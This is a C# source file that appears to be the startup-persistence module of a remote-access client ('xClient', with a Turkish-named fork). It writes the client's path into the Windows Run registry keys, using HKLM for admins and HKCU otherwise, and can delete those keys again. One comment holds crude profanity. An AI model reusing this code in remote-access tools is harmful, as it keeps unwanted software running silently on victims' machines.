using Microsoft.Win32;
using xClient.Ayarlar;
using xClient.KuuhakuÇekirdek.Veri;
using xClient.KuuhakuÇekirdek.Yardımcılar;

namespace xClient.KuuhakuÇekirdek.Kurulum
{
    public static class Başlangıç
    {
        // ReSharper bu sayfayıda sikiyo amına koycam siktiğimin yavşağı yeter amk
        private static string GetHKLMPath()
        {
            return (PlatformYardımcısı.A64Bitmi)
                ? "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
                : "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
        }

        public static bool AddToStartup()
        {
            if (WindowsAccountHelper.GetAccountType() == "Admin")
            {
                bool success = RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine, GetHKLMPath(),
                    Settings.STARTUPKEY, ClientVerisi.CurrentPath, true);

                if (success) return true;

                return RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY, ClientVerisi.CurrentPath,
                    true);
            }
            else
            {
                return RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY, ClientVerisi.CurrentPath,
                    true);
            }
        }

        public static bool RemoveFromStartup()
        {
            if (WindowsAccountHelper.GetAccountType() == "Admin")
            {
                bool success = RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine, GetHKLMPath(),
                    Settings.STARTUPKEY);

                if (success) return true;

                return RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY);
            }
            else
            {
                return RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY);
            }
        }
    }
}
